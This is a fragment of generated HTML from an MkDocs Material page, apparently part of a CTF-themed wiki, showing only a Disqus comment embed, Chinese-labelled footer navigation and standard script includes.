+  <div id="disqus_thread"></div>
+  <script>
+    var disqus_config = function () {
+      this.page.url = "None";
+      this.page.identifier =
+        "None";
+    };
+    (function() {
+      var d = document, s = d.createElement("script");
+      s.src = "//scu-ctf.disqus.com/embed.js";
+      s.setAttribute("data-timestamp", +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../" title="Index" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  后退
+                </span>
+                Index
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../../python/" title="Index" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  前进
+                </span>
+                Index
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../../assets/javascripts/application.2ba8dec4.js"></script>
+      
+        
+        
+          
+          <script src="../../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      
+        <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
+      
+        <script src="../../../../_static/js/extra.js"></script>
+      
+        <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+    
+  </body>
+</html>
